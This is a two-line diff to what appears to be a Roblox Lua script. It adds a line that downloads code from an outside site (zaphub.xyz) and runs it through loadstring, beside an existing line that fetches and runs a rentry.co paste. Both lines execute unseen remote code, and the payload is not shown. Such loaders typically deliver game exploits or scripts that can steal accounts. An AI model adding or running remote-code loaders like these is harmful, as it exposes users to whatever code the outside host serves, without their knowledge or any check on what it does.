@@ -1,1 +1,2 @@
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
 loadstring(game:HttpGet('https://rentry.co/ycvfkc54/raw',true))()
